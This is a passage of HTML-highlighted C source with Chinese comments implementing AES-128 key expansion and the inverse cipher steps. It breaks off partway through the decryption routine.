class="hljs-title">leftLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index++;<br>        index = index % <span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把数组中的第一、二、三和四元素分别作为</span><br><span class="hljs-comment"> * 4字节整型的第一、二、三和四字节，合并成一个4字节整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mergeArrayToInt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one = <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>;<br>    <span class="hljs-keyword">int</span> two = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>    <span class="hljs-keyword">int</span> three = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">int</span> four = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 常量轮值表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Rcon[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x01000000</span>, <span class="hljs-number">0x02000000</span>,<br>                              <span class="hljs-number">0x04000000</span>, <span class="hljs-number">0x08000000</span>,<br>                              <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x20000000</span>,<br>                              <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x80000000</span>,<br>                              <span class="hljs-number">0x1b000000</span>, <span class="hljs-number">0x36000000</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 密钥扩展中的T函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">T</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> numArray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> result;<br>    splitIntToArray(num, numArray);<br>    leftLoop4int(numArray, <span class="hljs-number">1</span>);<span class="hljs-comment">//字循环</span><br><br>    <span class="hljs-comment">//字节代换</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        numArray[i] = getNumFromSBox(numArray[i]);<br><br>    result = mergeArrayToInt(numArray);<br>    <span class="hljs-keyword">return</span> result ^ Rcon[round];<br>&#125;<br><br><span class="hljs-comment">//密钥对应的扩展数组</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> w[<span class="hljs-number">44</span>];<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印W数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printW</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">44</span>; i++,j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w[%d] = 0x%x &quot;</span>, i, w[i]);<br>        <span class="hljs-keyword">if</span>(j % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 扩展密钥，结果是把w[44]中的每个元素初始化</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">extendKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        w[i] = getWordFromStr(key + i * <span class="hljs-number">4</span>);<br><br><span class="hljs-comment">//    w[0] = 0x30373430;</span><br><span class="hljs-comment">//    w[1] = 0x63623964;</span><br><span class="hljs-comment">//    w[2] = 0x62383633;</span><br><span class="hljs-comment">//    w[3] = 0x636436F2;</span><br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">4</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span>( i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>) &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ T(w[i - <span class="hljs-number">1</span>], j);<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ w[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 轮密钥加</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> warray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br><br>        splitIntToArray(w[ round * <span class="hljs-number">4</span> + i], warray);<br><br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;%x \n&quot;, warray[j]);</span><br>            <span class="hljs-built_in">array</span>[j][i] = <span class="hljs-built_in">array</span>[j][i] ^ warray[j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 字节代换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">subBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromSBox(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    leftLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    leftLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    leftLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合要用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> colM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,<br>                                <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = s &lt;&lt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> a7 = result &amp; <span class="hljs-number">0x00000100</span>;<br><br>    <span class="hljs-keyword">if</span>(a7 != <span class="hljs-number">0</span>) &#123;<br>        result = result &amp; <span class="hljs-number">0x000000ff</span>;<br>        result = result ^ <span class="hljs-number">0x1b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul2(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul8</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul4(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul9</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul11</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul9(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul12</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ GFMul4(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul13</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul14</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * GF上的二元运算</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result;<br><br>    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)<br>        result = s;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>)<br>        result = GFMul2(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">3</span>)<br>        result = GFMul3(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0x9</span>)<br>        result = GFMul9(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xb</span>)<span class="hljs-comment">//11</span><br>        result = GFMul11(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xd</span>)<span class="hljs-comment">//13</span><br>        result = GFMul13(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xe</span>)<span class="hljs-comment">//14</span><br>        result = GFMul14(s);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(colM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(colM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4X4数组转回字符串</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertArrayToStr</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            *str++ = (<span class="hljs-keyword">char</span>)<span class="hljs-built_in">array</span>[j][i];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 检查密钥长度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">checkKeyLen</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(len == <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引从逆S盒中获取值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromS1Box</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S2[row][col];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆字节变换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deSubBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromS1Box(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4个元素的数组循环右移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rightLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    index = <span class="hljs-number">3</span> - index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index--;<br>        index = index == <span class="hljs-number">-1</span> ? <span class="hljs-number">3</span> : index;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deShiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    rightLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    rightLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    rightLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> deColM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>,<br>                                  <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>,<br>                                  <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>,<br>                                  <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deMixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(deColM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(deColM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把两个4X4数组进行异或</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundTowArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> aArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>],<span class="hljs-keyword">int</span> bArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            aArray[i][j] = aArray[i][j] ^ bArray[i][j];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 从4个32位的密钥字中获得4X4数组，</span><br><span class="hljs-comment"> * 用于进行逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getArrayFrom4W</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> index,j;<br>    <span class="hljs-keyword">int</span> colOne[<span class="hljs-number">4</span>], colTwo[<span class="hljs-number">4</span>], colThree[<span class="hljs-number">4</span>], colFour[<span class="hljs-number">4</span>];<br>    index = i * <span class="hljs-number">4</span>;<br>    splitIntToArray(w[index], colOne);<br>    splitIntToArray(w[index + <span class="hljs-number">1</span>], colTwo);<br>    splitIntToArray(w[index + <span class="hljs-number">2</span>], colThree);<br>    splitIntToArray(w[index + <span class="hljs-number">3</span>], colFour);<br><br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">0</span>] = colOne[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">1</span>] = colTwo[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">2</span>] = colThree[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">3</span>] = colFour[j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 c: 密文的字符串数组。</span><br><span class="hljs-comment"> * 参数 clen: 密文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deAes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *c, <span class="hljs-keyword">int</span> clen, <span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> cArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> keylen,k;<br>    keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">if</span>(clen == <span class="hljs-number">0</span> || clen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密文字符长度必须为16的倍数！现在的长度为%d\n&quot;</span>,clen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; clen; k += <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> wArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>        convertToIntArray(c + k, cArray);<br><br><br><br><br><br>        addRoundKey(cArray, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            deSubBytes(cArray);<br><br>            deShiftRows(cArray);<br><br>            deMixColumns(cArray);<br>            getArrayFrom4W(i, wArray);<br>            